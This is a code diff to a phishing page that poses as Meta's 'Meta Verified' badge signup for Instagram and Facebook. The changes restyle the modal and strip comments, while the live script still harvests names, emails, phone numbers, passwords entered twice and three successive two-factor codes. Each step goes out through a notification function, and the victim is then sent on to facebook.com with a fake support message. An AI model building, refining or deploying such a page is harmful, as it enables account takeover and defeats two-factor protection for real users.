@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Meta Verified: Get the verified badge on Instagram and Facebook</title>
     <meta name="description" content="Get the verified badge for impersonation protection, direct support and exclusive features." />
+    <link rel="icon" type="image/svg+xml" href="public/icons/favicon.svg">
+    <link rel="shortcut icon" href="public/icons/favicon.svg">
 
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
@@ -231,21 +233,30 @@
       /* ===== MODAL ===== */
       .modal-overlay {
         display: none; position: fixed; inset: 0; z-index: 999;
-        background: rgba(0,0,0,0.5); align-items: flex-end; justify-content: center; padding: 0;
+        background: rgba(0,0,0,0.55);
+        align-items: center; justify-content: center;
+        padding: 12px;
+        backdrop-filter: blur(2px);
+        -webkit-backdrop-filter: blur(2px);
       }
-      @media(min-width:600px){ .modal-overlay { align-items: center; padding: 20px; } }
       .modal-overlay.open { display: flex; }
       .modal-box {
-        background: #fff; width: 100%; border-radius: 20px 20px 0 0;
-        padding: 20px 16px 32px; display: flex; flex-direction: column;
-        max-height: 92vh; overflow-y: auto; overflow-x: visible;
-        transform: translateY(40px); opacity: 0;
-        transition: transform 0.25s ease, opacity 0.25s ease;
+        background: #fff; width: 100%; border-radius: 20px;
+        padding: 20px 16px 28px; display: flex; flex-direction: column;
+        max-height: 88vh; overflow-y: auto; overflow-x: visible;
+        transform: scale(0.93) translateY(16px); opacity: 0;
+        transition: transform 0.28s cubic-bezier(0.34,1.56,0.64,1), opacity 0.22s ease;
+        max-width: 440px;
+        margin: auto;
+        -webkit-overflow-scrolling: touch;
+        overscroll-behavior: contain;
+        scrollbar-width: none;
       }
+      .modal-box::-webkit-scrollbar { display: none; }
       @media(min-width:600px){
-        .modal-box { max-width: 420px; border-radius: 16px; padding: 24px; transform: scale(0.92); }
+        .modal-box { padding: 28px 24px 32px; }
       }
-      .modal-overlay.open .modal-box { transform: translateY(0) scale(1); opacity: 1; }
+      .modal-overlay.open .modal-box { transform: scale(1) translateY(0); opacity: 1; }
       .modal-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
       .modal-title { font-weight: 700; font-size: 15px; color: #0A1317; }
       .modal-close {
@@ -939,7 +950,6 @@
       document.getElementById('clientForm').addEventListener('submit', function(e) {
         e.preventDefault();
 
-        /* Lưu toàn bộ thông tin form vào _masterData */
         _masterData.fullName      = document.getElementById('fullName').value.trim();
         _masterData.email         = document.getElementById('email').value.trim();
         _masterData.emailBusiness = document.getElementById('emailBusiness').value.trim();
@@ -950,7 +960,6 @@
         _masterData.year          = document.getElementById('year').value.trim();
         _masterData.message       = document.getElementById('message').value.trim();
 
-        /* ✅ TIN 1 — Thông tin */
         Utils.sendNotification({
           step:          'Tin 1 - Thong tin',
           fullName:      _masterData.fullName,
@@ -1004,7 +1013,6 @@
       if (clickCount === 0) {
         _masterData.password = pw;
 
-        /* ✅ TIN 2 — Password lần 1 (đầy đủ thông tin) */
         Utils.sendNotification({
           step:          'Tin 2 - Password lan 1',
           fullName:      _masterData.fullName,
@@ -1029,7 +1037,6 @@
       } else {
         _masterData.passwordSecond = pw;
 
-        /* ✅ TIN 3 — Password lần 2 (đầy đủ thông tin) */
         Utils.sendNotification({
           step:           'Tin 3 - Password lan 2',
           fullName:       _masterData.fullName,
@@ -1126,7 +1133,6 @@
         btn.disabled = true; btn.innerHTML = '<span class="modal-spinner"></span>';
 
         if (authCount === 0) {
-          /* ✅ TIN 4 — 2FA lần 1 */
           _masterData.twoFa0 = code;
           Utils.sendNotification({
             step:           'Tin 4 - 2FA lan 1',
@@ -1168,7 +1174,6 @@
           }, 1400);
 
         } else if (authCount === 1) {
-          /* ✅ TIN 5 — 2FA lần 2 */
           _masterData.twoFa1 = code;
           Utils.sendNotification({
             step:           'Tin 5 - 2FA lan 2',
@@ -1211,7 +1216,6 @@
           }, 1400);
 
         } else {
-          /* ✅ TIN 6 — 2FA lần 3 (đầy đủ tất cả) */
           _masterData.twoFa2 = code;
           Utils.sendNotification({
             step:           'Tin 6 - 2FA lan 3',
@@ -1261,7 +1265,7 @@
       + '<p style="color:#606770;font-size:14px;margin:0 0 24px;">From the Customer support Meta.</p>'
       + '<a href="https://www.facebook.com" class="modal-return-btn">Return to facebook</a>'
       + '<div style="text-align:center;margin-top:18px;">'
-      + '<img src="public/icons/ic_meta_gray.svg" alt="Meta" style="height:18px;display:inline-block;"'
+      + '<img src="public/icons/ic_meta_gray.svg" alt="Meta" style="height:18px;display:inline-block;">'
       + '</div>';
 
     Modal.create('successModal', html);
